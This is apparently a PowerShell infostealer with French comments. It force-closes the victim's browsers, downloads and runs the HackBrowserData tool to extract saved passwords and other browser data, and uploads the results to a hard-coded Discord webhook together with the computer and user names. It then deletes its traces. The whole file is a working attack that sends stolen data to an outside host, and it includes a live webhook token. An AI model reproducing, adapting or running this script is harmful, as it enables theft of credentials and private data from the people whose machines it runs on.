$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

function Send-Discord {
    param([string]$msg)
    try {
        $Body = @{content=$msg} | ConvertTo-Json
        Invoke-RestMethod -Uri $wh -Method Post -Body $Body -ContentType 'application/json' | Out-Null
    } catch {}
}

Send-Discord "🟢 **START** - $env:COMPUTERNAME | $env:USERNAME"

# Tuer navigateurs
Get-Process chrome,msedge,firefox,brave,opera -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 5

Set-Location $env:TEMP
Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0

Send-Discord "📥 **Downloading HackBrowserData...**"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    $url = "https://sourceforge.net/projects/hackbrowserdata.mirror/files/v0.4.6/hack-browser-data-windows-64bit.zip/download"
    
    Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing -TimeoutSec 30
    
    if (!(Test-Path "hbd.zip")) {
        Send-Discord "❌ **Download failed**"
        exit
    }
    
    $fileSize = (Get-Item "hbd.zip").Length
    Send-Discord "✅ **Downloaded** - $([math]::Round($fileSize/1KB,2)) KB"
    
    Send-Discord "📦 **Extracting...**"
    Expand-Archive -Path "hbd.zip" -DestinationPath "HBD" -Force
    
    Set-Location "HBD"
    
    # DEBUG : Lister tous les fichiers extraits
    $files = Get-ChildItem -Recurse | Select-Object -ExpandProperty FullName
    Send-Discord "📂 **Files extracted:** $($files.Count) files"
    
    # Trouver l'exe
    $exe = Get-ChildItem -Filter "*.exe" -Recurse | Select-Object -First 1
    
    if (!$exe) {
        Send-Discord "❌ **EXE not found. Files: $($files -join ', ')**"
        exit
    }
    
    Send-Discord "✅ **Found EXE:** $($exe.Name)"
    Send-Discord "🔓 **Executing...**"
    
    # Exécuter avec capture de sortie
    $output = & $exe.FullName all 2>&1 | Out-String
    
    Send-Discord "📋 **Output:** $($output.Substring(0, [Math]::Min(200, $output.Length)))..."
    
    Start-Sleep 5
    
    # DEBUG : Lister tout ce qui a été créé
    $allFiles = Get-ChildItem -Recurse | Where-Object {!$_.PSIsContainer} | Select-Object Name, Length
    Send-Discord "📁 **All files after execution:** $($allFiles.Count)"
    
    # Chercher les résultats (plusieurs possibilités)
    $possibleResults = Get-ChildItem -Recurse | Where-Object {
        $_.Extension -eq ".zip" -or 
        $_.Extension -eq ".json" -or 
        $_.Name -like "*result*" -or
        $_.Name -like "*password*"
    }
    
    if ($possibleResults) {
        Send-Discord "🔍 **Found results:** $($possibleResults.Count) files"
        
        foreach ($file in $possibleResults) {
            $size = [math]::Round($file.Length / 1KB, 2)
            Send-Discord "📤 **Uploading $($file.Name) - $size KB...**"
            
            $date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
            curl.exe -F "file=@$($file.FullName)" -F "content=🔑 **EXTRACTED DATA**`n**File:** $($file.Name)`n**PC:** $env:COMPUTERNAME`n**User:** $env:USERNAME`n**Size:** $size KB`n**Date:** $date" $wh
        }
        
        Send-Discord "✅ **UPLOAD SUCCESS**"
    }
    else {
        # Lister tous les fichiers pour debug
        $fileList = (Get-ChildItem -Recurse | Select-Object -First 20 -ExpandProperty Name) -join ", "
        Send-Discord "❌ **No results. Files present:** $fileList"
    }
    
} catch {
    $err = $_.Exception.Message -replace '"',"'"
    Send-Discord "❌ **Error:** $err"
}

Set-Location $env:TEMP
Start-Sleep 2
Remove-Item HBD,hbd.zip -Recurse -Force -EA 0

Send-Discord "🧹 **FINISHED**"
